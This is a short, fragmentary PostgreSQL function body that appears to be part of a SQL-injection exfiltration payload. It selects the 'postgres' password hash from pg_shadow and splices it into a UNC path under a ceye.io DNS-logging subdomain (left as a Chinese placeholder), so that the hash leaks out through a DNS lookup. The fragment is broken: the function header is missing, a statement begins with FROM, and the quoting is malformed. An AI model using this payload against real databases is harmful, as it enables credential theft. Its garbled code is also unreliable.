RETURNS VOID AS $

BEGIN
SELECT INTO query_result (SELECT passwd
FROM pg_shadow WHERE usename='postgres');

FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.<你的>.ceye.io\\\\foobar.txt\'';
